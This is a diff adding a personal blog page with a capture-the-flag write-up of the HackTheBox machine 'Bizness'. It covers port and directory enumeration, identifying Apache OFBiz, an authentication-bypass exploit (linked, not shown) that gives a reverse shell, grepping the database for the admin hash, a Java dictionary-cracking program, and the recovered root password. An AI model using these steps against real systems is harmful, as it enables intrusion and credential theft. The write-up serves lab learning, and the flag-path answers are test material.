@@ -1,0 +1,355 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="http://localhost:1337/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="http://localhost:1337/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="http://localhost:1337/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Bizness Bizness is an &#34;Easy&#34; unix box. Enumeration &amp; Fingerprinting The first step has been to enumerate active ports and associated services. Enumerate all opened (TCP) ports: &gt; nmap -sV -sC -oN bizness.nmap 10.129.255.188 Nmap scan report for 10.129.255.188 ... PORT STATE SERVICE VERSION 22/tcp …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="CTF: HackTheBox Bizness"/>
+  <meta property="og:description" content="Bizness Bizness is an &#34;Easy&#34; unix box. Enumeration &amp; Fingerprinting The first step has been to enumerate active ports and associated services. Enumerate all opened (TCP) ports: &gt; nmap -sV -sC -oN bizness.nmap 10.129.255.188 Nmap scan report for 10.129.255.188 ... PORT STATE SERVICE VERSION 22/tcp …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="http://localhost:1337/ctf/htb/bizness.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2024-01-09 18:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
+  <meta property="article:section" content="CTF"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; CTF: HackTheBox Bizness</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="http://localhost:1337/">
+      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="http://localhost:1337/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="http://localhost:1337/">Home</a>
+
+  <a href="/categories.html">Categories</a>
+  <a href="/category/cheatsheet.html">Cheatsheets</a>
+  <a href="/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="ctf/htb/bizness">CTF: HackTheBox Bizness</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#bizness" title="Bizness">Bizness</a><ul><li><a class="toc-href" href="#enumeration-fingerprinting" title="Enumeration &amp; Fingerprinting">Enumeration &amp; Fingerprinting</a></li><li><a class="toc-href" href="#foothold" title="Foothold">Foothold</a></li><li><a class="toc-href" href="#privilege-escalation" title="Privilege Escalation">Privilege Escalation</a></li></ul></li></ul></div>
+        </div>
+    <h2 id="bizness">Bizness</h2>
+<p>Bizness is an "Easy" unix box.</p>
+<h3 id="enumeration-fingerprinting">Enumeration &amp; Fingerprinting</h3>
+<p>The first step has been to enumerate active ports and associated services.</p>
+<p>Enumerate all opened (TCP) ports:</p>
+<blockquote>
+<p>&gt; nmap -sV -sC -oN bizness.nmap 10.129.255.188<br/>
+Nmap scan report for 10.129.255.188<br/>
+...<br/>
+PORT    STATE SERVICE  VERSION<br/>
+22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)<br/>
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)<br/>
+|<em>  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)<br/>
+80/tcp  open  http     nginx 1.18.0<br/>
+|_http-server-header: nginx/1.18.0<br/>
+|_http-title: Did not follow redirect to https://bizness.htb/<br/>
+443/tcp open  ssl/http nginx 1.18.0<br/>
+| tls-nextprotoneg: <br/>
+|</em>  http/1.1<br/>
+| ssl-cert: Subject: organizationName=Internet Widgits Pty   Ltd/stateOrProvinceName=Some-State/countryName=UK<br/>
+| Not valid before: 2023-12-14T20:03:40<br/>
+|<em>Not valid after:  2328-11-10T20:03:40<br/>
+| tls-alpn: <br/>
+|</em>  http/1.1<br/>
+|_http-title: Did not follow redirect to https://bizness.htb/<br/>
+|_http-server-header: nginx/1.18.0<br/>
+|_ssl-date: TLS randomness does not represent time  </p>
+</blockquote>
+<p>Ports open are 22, 80 and 443; the "bizness.htb" domain is added to /etc/hosts.</p>
+<p>Some kind of a corporate landing page is presented:</p>
+<p><img alt="bizness-home.png" src="http://localhost:1337/images/ctf/htb/machines/bizness/bizness-home.png"/></p>
+<p>Directories can be bruteforced by excluding 302 with <em>gobuster</em> since the site responds with a 302 for each not existent path:</p>
+<blockquote>
+<p>&gt; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u https://bizness.htb -k -b 302,404</p>
+</blockquote>
+<p>Anyway, with this approach, some redirects of interest can be lost; to achieve a better enumeration, ffuf is used excluding responses redirecting to the home page:</p>
+<blockquote>
+<p>&gt;  ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u https://bizness.htb/FUZZ -fr 'Location: https://bizness.htb/'
+...
+control                 [Status: 200, Size: 34633, Words: 10468, Lines: 492, Duration: 244ms]</p>
+</blockquote>
+<p>The enumerated page is the following:</p>
+<p><img alt="bizness-error-page.png" src="http://localhost:1337/images/ctf/htb/machines/bizness/bizness-error-page.png"/></p>
+<p>The error message leaks an important information about the technology running the site:</p>
+<blockquote>
+<p>org.apache.ofbiz.webapp.control.RequestHandlerException</p>
+</blockquote>
+<p>Apache OFBiz, a Java web framework, is being used.</p>
+<p>Another bruteforce is ran against the /control endpoint:</p>
+<blockquote>
+<p>&gt; ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u https://bizness.htb/control/FUZZ -fl 492<br/>
+...<br/>
+main                    [Status: 200, Size: 9307, Words: 913, Lines: 141, Duration: 499ms]<br/>
+logout                  [Status: 200, Size: 10755, Words: 1182, Lines: 180, Duration: 1718ms]<br/>
+view                    [Status: 200, Size: 9307, Words: 913, Lines: 141, Duration: 641ms]<br/>
+help                    [Status: 200, Size: 10755, Words: 1182, Lines: 180, Duration: 1582ms]<br/>
+login                   [Status: 200, Size: 11059, Words: 1236, Lines: 186, Duration: 2311ms]<br/>
+views                   [Status: 200, Size: 9307, Words: 913, Lines: 141, Duration: 368ms]
+qrcode                  [Status: 200, Size: 10755, Words: 1182, Lines: 180, Duration: 4153ms]
+forgotPassword          [Status: 200, Size: 11059, Words: 1442, Lines: 175, Duration: 3108ms]
+...</p>
+</blockquote>
+<p>In the login page is reported the OFBiz version:</p>
+<p><img alt="ofbiz-login.png" src="http://localhost:1337/images/ctf/htb/machines/bizness/ofbiz-login.png"/></p>
+<h3 id="foothold">Foothold</h3>
+<p>This version of OFBiz appears to be vulnerable to two specific vulnerabilities:
+- Authentication Bypass (CVE-2023-51467)
+- Pre-auth RCE (CVE-2023-49070)</p>
+<p>This <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master">exploit</a> and a reverse shell is obtained:
+<img alt="ofbiz-exploit.png" src="http://localhost:1337/images/ctf/htb/machines/bizness/ofbiz-exploit.png"/></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Some enumeration is performed using various tools such as LinEnum, linpeas, pspy64 but nothing of interest was found.</p>
+<p>Since the application is configured to run with a Derby database instance (default configuration); the database data is located at:</p>
+<blockquote>
+<p>/opt/ofbiz/runtime/data/derby/ofbiz</p>
+</blockquote>
+<p>Trying to get 'admin' password:</p>
+<blockquote>
+<p>&gt; grep -a 'admin' ./* | sed -E 's/\s+/ /g' | grep -a -i 'password'<br/>
+...<br/>
+./c54d0.dat: \&lt;eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" l<br/>
+astUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/  </p>
+</blockquote>
+<p>This hash is leaked:</p>
+<blockquote>
+<p>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</p>
+</blockquote>
+<p>Taking a look at the <a href="https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java#L143">OFBiz code</a>, it seems to be a SHA-1 salted hash, formed as follows:</p>
+<blockquote>
+<p><strong>$</strong>HASH ALG<strong>$</strong>SALT<strong>$</strong>HASH ALG(SALT + PASSWORD)</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code>    public static String cryptBytes(String hashType, String salt, byte[] bytes) {
+        if (hashType == null) {
+            hashType = "SHA";
+        }
+        if (salt == null) {
+            salt = RandomStringUtils.random(new SecureRandom().nextInt(15) + 1, CRYPT_CHAR_SET);
+        }
+        StringBuilder sb = new StringBuilder();
+        sb.append("$").append(hashType).append("$").append(salt).append("$");
+        sb.append(getCryptedBytes(hashType, salt, bytes));
+        return sb.toString();
+    }
+</code></pre></div>
+<p>In order to crack the hash, <em>cryptBytes</em> function has been used in the following Java code, performing a dictionary brute force attack:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileReader</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.security.MessageDigest</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.security.NoSuchAlgorithmException</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.charset.StandardCharsets</span><span class="p">;</span>
+
+<span class="n">public</span> <span class="k">class</span> <span class="nc">Crack</span><span class="p">{</span>    
+
+    <span class="n">private</span> <span class="n">static</span> <span class="n">String</span> <span class="n">getCryptedBytes</span><span class="p">(</span><span class="n">String</span> <span class="n">hashType</span><span class="p">,</span> <span class="n">String</span> <span class="n">salt</span><span class="p">,</span> <span class="n">byte</span><span class="p">[]</span> <span class="nb">bytes</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="n">MessageDigest</span> <span class="n">messagedigest</span> <span class="o">=</span> <span class="n">MessageDigest</span><span class="o">.</span><span class="n">getInstance</span><span class="p">(</span><span class="n">hashType</span><span class="p">);</span>
+            <span class="n">messagedigest</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">salt</span><span class="o">.</span><span class="n">getBytes</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="o">.</span><span class="n">UTF_8</span><span class="p">));</span>
+            <span class="n">messagedigest</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">bytes</span><span class="p">);</span>
+            <span class="n">String</span> <span class="n">result</span> <span class="o">=</span>  <span class="n">Base64</span><span class="o">.</span><span class="n">getUrlEncoder</span><span class="p">()</span><span class="o">.</span><span class="n">withoutPadding</span><span class="p">()</span><span class="o">.</span><span class="n">encodeToString</span><span class="p">(</span><span class="n">messagedigest</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'+'</span><span class="p">,</span> <span class="s1">'.'</span><span class="p">);</span>
+<span class="o">//</span>            <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+            <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">NoSuchAlgorithmException</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="s2">""</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+
+    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">){</span>
+        <span class="n">BufferedReader</span> <span class="n">reader</span><span class="p">;</span>
+
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="n">reader</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span> <span class="n">FileReader</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
+            <span class="n">String</span> <span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="n">readLine</span><span class="p">();</span>
+            <span class="n">String</span> <span class="nb">hash</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+            <span class="k">while</span> <span class="p">(</span><span class="n">line</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+
+                <span class="k">if</span><span class="p">(</span><span class="nb">hash</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="n">getCryptedBytes</span><span class="p">(</span><span class="s2">"SHA"</span><span class="p">,</span><span class="s2">"d"</span><span class="p">,</span> <span class="n">line</span><span class="o">.</span><span class="n">trim</span><span class="p">()</span><span class="o">.</span><span class="n">getBytes</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="o">.</span><span class="n">UTF_8</span><span class="p">))))</span>
+                <span class="p">{</span>
+                    <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">"Found: "</span><span class="o">+</span> <span class="n">line</span><span class="o">.</span><span class="n">trim</span><span class="p">());</span>
+                <span class="p">}</span>
+
+                <span class="o">//</span> <span class="n">read</span> <span class="nb">next</span> <span class="n">line</span>
+                <span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="n">readLine</span><span class="p">();</span>
+            <span class="p">}</span>
+
+            <span class="n">reader</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">IOException</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>ran as follows:</p>
+<blockquote>
+<p>&gt; javac Crack.java &amp;&amp; java Crack /usr/share/dict/rockyou.txt uP0_QaVBpDWFeo8-dRzDqRwXQ2I<br/>
+<br/>
+Found: monkeybizness</p>
+</blockquote>
+<p>Recovered password is root password.</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "http://localhost:1337",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
+      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="http://localhost:1337/theme/stork/stork.js"></script>
+
+</body>
+</html>
